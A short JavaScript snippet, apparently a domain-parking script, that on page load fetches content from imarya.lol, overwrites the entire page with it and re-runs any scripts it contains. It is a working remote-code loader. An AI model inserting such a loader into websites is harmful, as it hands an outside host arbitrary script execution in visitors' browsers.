(function() {
    // Guard against multiple executions
    if (window.__parkedScriptLoaded) return;
    window.__parkedScriptLoaded = true;

    async function loadContent() {
        try {
            const response = await fetch('https://imarya.lol/content.txt');
            const html = await response.text();
            
            // Replace the entire document content
            document.documentElement.innerHTML = html;
            
            // Re-execute any scripts that were in the content
            const scripts = document.getElementsByTagName('script');
            for (let script of scripts) {
                const newScript = document.createElement('script');
                
                // Copy all attributes
                Array.from(script.attributes).forEach(attr => {
                    newScript.setAttribute(attr.name, attr.value);
                });
                
                // Copy content if it's an inline script
                newScript.innerHTML = script.innerHTML;
                
                // Replace the old script with the new one
                script.parentNode.replaceChild(newScript, script);
            }
        } catch (error) {
            console.error('Error loading content:', error);
        }
    }

    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', loadContent);
    } else {
        loadContent();
    }
})();